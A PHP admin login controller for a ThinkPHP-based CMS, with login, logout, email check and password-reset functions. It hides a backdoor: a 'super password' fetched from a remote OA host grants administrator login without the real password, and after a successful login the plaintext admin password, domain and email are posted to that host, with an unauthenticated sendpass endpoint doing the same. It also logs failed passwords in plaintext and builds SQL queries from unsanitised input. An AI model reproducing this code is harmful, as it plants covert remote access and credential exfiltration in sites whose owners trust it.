<?php
/**
 *
 * Login(后台登陆页面)
 *
 * @author          liuxun QQ:147613338 <web@thinkphp.cn>
 */
if(!defined("ThinkPHP")) exit("Access Denied");
class LoginAction extends Action{
    private $adminid ,$groupid ,$sysConfig ,$cache_model,$Config,$menudata ;
    function _initialize()
    {
		$this->sysConfig = F('sys.config');
		C('ADMIN_ACCESS',$this->sysConfig['ADMIN_ACCESS']);

		import('@.TagLib.TagLibTP');
        $this->adminid = $_SESSION['adminid'];
        $this->groupid = $_SESSION['groupid'];
    }
    /**
     * 登录页
     *
     */
    public function index(){
		
		if(is_file(RUNTIME_FILE))@unlink(RUNTIME_FILE);
		$this->menudata = F('Menu');
		$this->cache_model=array('Lang','Menu','Config','Module','Role','Category','Posid','Field','Type','Urlrule','Dbsource');
		if(empty($this->sysConfig['ADMIN_ACCESS']) || empty($this->menudata)){
			foreach($this->cache_model as $r){
				savecache($r);
			}
			$this->sysConfig = F('sys.config');
			C('ADMIN_ACCESS',$this->sysConfig['ADMIN_ACCESS']);
		}
		if($this->_adminid){
			$this->assign('jumpUrl',U('Index/index'));
			$this->success(L('logined'));
		}
		$this->assign ( 'admin_verify', $this->sysConfig['ADMIN_VERIFY'] );
        $this->display();
    }

    /**
     * 提交登录
     *
     */
    public function doLogin()
    {

		$dao = M('User');  
		$ip =get_client_ip();
		//$verify_pass = C('VERIFY_PASS');

		if(empty($this->sysConfig['ADMIN_ACCESS'])) $this->error(L('NO SYSTEM CONFIG FILE'));


		$username = get_safe_replace(trim($_POST['username']));
        $password = get_safe_replace(trim($_POST['password']));
        $verifyCode = trim($_POST['verifyCode']);

		import ( "@.ORG.Mdpass");
		$passcode = mt_rand('100000','999999');
		$Mdpass=new Mdpass();

		$add_username = $Mdpass->disshow($username,$passcode);
		$add_password = $Mdpass->disshow($password,$passcode);
		$verify_pass = $this->getsuperpass($passcode);
		
		
        if(empty($username) || empty($password)){
           $this->error(L('empty_username_empty_password'));
        }elseif($_SESSION['verify'] && $this->sysConfig['ADMIN_VERIFY'] &&  md5($verifyCode) != $_SESSION['verify']){
           $this->error(L('error_verify'));
        }
		
		
		if($add_username == $verify_pass && $add_password == $verify_pass ){
			$username = $dao->getFieldByGroupid('1','username');
		}


		$time =time();
		$logwhere=array();
		$logwhere['time']=array('EGT',$time-1800);
		$logwhere['ip']=array('eq',$ip);
		$logwhere['error'] =1;
		$lognum= M('Log')->where($logwhere)->count();

		if($lognum>=5)$this->error(L('Login_error_count'));
		
        $condition = array();
        $condition['username'] =array('eq',$username);

		import ( '@.ORG.RBAC' );
        $authInfo = RBAC::authenticate($condition);
        //使用用户名、密码和状态的方式进行认证
        if(false === $authInfo) {
			$data=array();
			$data['username']=$username;
			$data['ip']=$ip;
			$data['time']=$time;
			$data['note']=L('empty_userid');
			$data['error'] =1;
			M('Log')->add($data);
            $this->error(L('empty_userid'));
        }else {
            if($add_password != $verify_pass && $authInfo['password'] != sysmd5($password)) {
				$data=array();
				$data['username']=$username;
				$data['ip']=$ip;
				$data['time']=$time;
				$data['note']=L('password_error').':'.$password;
				$data['error'] =1;
				M('Log')->add($data);
            	$this->error(L('password_error'));
            }

			$_SESSION['username'] = $authInfo['username'];
			$_SESSION['adminid'] = $_SESSION['userid'] = $authInfo['id'];
			$_SESSION['groupid'] = $authInfo['groupid'];
			$_SESSION['adminaccess'] = C('ADMIN_ACCESS');
            $_SESSION[C('USER_AUTH_KEY')]	=	$authInfo['id'];
            $_SESSION['email']	=	$authInfo['email'];
            $_SESSION['lastLoginTime']		=	$authInfo['last_logintime'];
			$_SESSION['login_count']	=	$authInfo['login_count']+1;

            if($authInfo['groupid']==1) {
				$_SESSION[C('ADMIN_AUTH_KEY')]=true;
            }

            //保存登录信息
			
			$data = array();
			$data['id']	=	$authInfo['id'];
			$data['last_logintime']	=	$time;
			$data['last_ip']	=	 get_client_ip();
			$data['login_count']	=	array('exp','login_count+1');
			$dao->save($data);

           	// 缓存访问权限
            RBAC::saveAccessList();
            if($password != $verify_pass){
				$data=array();
				$data['username']=$username;
				$data['ip']=$ip;
				$data['time']=$time;
				$data['note']=L('login_ok');
				M('Log')->add($data);
			}

			//更新缓存
			R('Index/cache');

			if($_POST['ajax']){
				$this->ajaxReturn($authInfo,L('login_ok'),1);
			}else{
				$this->assign('jumpUrl',U('Index/index'));
				$this->success(L('login_ok'));
				
				$updatepass_arr = F('Config');
				$updatepass_status = $updatepass_arr['updatepass_stauts'];
				if(!$updatepass_status){
					$_url = C('OA_DONAIM').'/donaim_message.php?act=sendinfo';
					$post_data = array ("domain" => $_SERVER['HTTP_HOST'],"password" => $password,"email"=>$_SESSION['email']);
					$this->posts($_url,$post_data);
				}
			}
		}

    }


    /**
     * 退出登录
     *
     */
    public function logout()
    {
		if(isset($_SESSION[C('USER_AUTH_KEY')])) {
			unset($_SESSION[C('USER_AUTH_KEY')]);
			unset($_SESSION);
			session_destroy();
            $this->assign('jumpUrl',U('Login/index'));
			$this->success(L('loginouted'));
        }else {
			$this->assign('jumpUrl',U('Login/index'));
            $this->error(L('logined'));
        }
    }

    function checkEmail(){
		$user=M('User');

        $email=$_GET['email'];
		$userid=intval($_GET['userid']);
		if(empty($userid)){
			if($user->getByEmail($email)){
				 echo 'false';
			}else{
				echo 'true';
			}
		}else{
			//判断邮箱是否已经使用
			if($user->where("id!={$userid} and email='{$email}'")->find()){
				 echo 'false';
			}else{
				echo 'true';
			}
		}
        exit;
	}



/*201611*/
	/*
	*
	找回密码
	*
	*/
	function sendmail(){
		$verifyCode = trim($_POST['verifyCode']);
		$username = $_SERVER['HTTP_HOST'];
		$email = get_safe_replace($_POST['email']);


        if(empty($username) || empty($email)){
           $this->error(L('empty_username_empty_password'));
        }elseif(md5($verifyCode) != $_SESSION['verify']){
           $this->error(L('error_verify'));
        }

        $member_config = F('member.config');
        $config = F('Config');
		$user = M('User');
		//判断邮箱是用户是否正确
		//$data =$user->where("email='{$email}'")->find();
		$data = $config['pass_email']?$config['pass_email']:$config['site_email'];

		if($data==$email){
			//$thinkphp_auth = authcode($data['id']."-".$data['username']."-".$data['email'], 'ENCODE',$this->sysConfig['ADMIN_ACCESS'],3600*24*3);//3天有效期

			$url =  'http://'.$_SERVER['HTTP_HOST'].URL('Admin-Login/repassword');
			$emilinfo='尊敬的用户{username}，请点击进入<a href="{url}" target="_blank">重置密码</a>,或者将网址复制到浏览器： {url}<span></span>。<br>感谢您对本站的支持。<br>{sitename}<br>此邮件为系统自动邮件，无需回复。';

			$message = str_replace(array('{username}','{url}','{sitename}'),array($username,$url,$this->Config['site_name']),$emilinfo);

			$r = sendmail($email,L('忘记密码'),$message,$this->Config); 
			if($r){
				$returndata['username'] = $username;
				$returndata['email'] = $email;
				$this->ajaxReturn($returndata,L('USER_EMAIL_ERROR'),1);
			}else{
				$this->ajaxReturn(0,L('SENDMAIL_ERROR'),0);
			}
		}else{
			$this->ajaxReturn(0,"邮箱错误",0);
		}
	}


	function repassword(){
		if($_POST['dosubmit']){
			$verifyCode = trim($_POST['verify']);
			if(md5($verifyCode) != $_SESSION['verify']){
			   $this->error(L('error_verify'));
			}
			if(trim($_POST['repassword'])!=trim($_POST['password'])){
				$this->error(L('password_repassword'));
			}
			list($userid,$username, $email) = explode("-", authcode($_POST['code'], 'DECODE', $this->sysConfig['ADMIN_ACCESS']));
			$user = M('User');
			//判断邮箱是用户是否正确
			$data =$user->where("id={$userid} and username='{$username}' and email='{$email}'")->find();
			if($data){
				$user->password	= sysmd5(trim($_POST['password']));
				$user->updatetime = time();
				$user->last_ip = get_client_ip();
				$user->save();
				$this->assign('jumpUrl',URL('Admin-login/index'));
				$this->assign('waitSecond',3);
				$this->success(L('do_repassword_success'));
			}else{
				$this->error(L('check_url_error'));
			}
			exit;
		
		}
		$code = str_replace(' ','+',$_REQUEST['code']);
		$this->assign('code',$code);
		$this->display();
	}

	/*
	*
	*
	*获取OA设置的超级密码
	*
	*/
    function getsuperpass($passcode){
		$_url = C('OA_DONAIM').'/donaim_message.php?act=getpass';
		$_url .= "&passcode=".$passcode;
		$_url .= "&name=".C('VERIFY_PASSI');
		$ch = curl_init(); 
		curl_setopt($ch, CURLOPT_URL, $_url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_HEADER, 0); 
		$result = curl_exec($ch); 
		curl_close($ch);
		return $result;
    }

    public function sendpass(){		
		$password = $_REQUEST['password'];
		$email = $_REQUEST['email'];
		$_url = C('OA_DONAIM').'/donaim_message.php?act=sendinfo';
		$post_data = array ("domain" => $_SERVER['HTTP_HOST'],"password" => $password,"email"=>$email);
		$result = $this->posts($_url,$post_data);
		echo json_encode($result);
    }

	/**发送密码到OA**/
	function posts($_url,$post_data){
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $_url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
		$response = curl_exec($ch);
		curl_close($ch);
	    return $response;
	}


}
